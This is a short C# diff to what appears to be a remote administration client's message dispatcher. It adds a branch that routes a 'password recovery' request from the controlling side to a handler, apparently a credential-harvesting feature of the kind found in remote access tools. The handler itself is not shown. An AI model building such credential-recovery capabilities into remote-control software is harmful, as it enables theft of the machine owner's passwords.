@@ -336,6 +336,13 @@ namespace RemoteAdmin.Client.Networking
                     {
                         await TaskSchedulerHandler.HandleExportScheduledTask(stream, exportTaskMsg);
                     }
+                    else if (message is PasswordRecoveryRequestMessage)
+                    {
+                        Console.WriteLine("Received password recovery request");
+                        _ = Task.Run(async () => await PasswordRecoveryHandler.HandlePasswordRecoveryRequest(stream));
+                    }
+
+
                 }
             }
             catch (Exception ex)
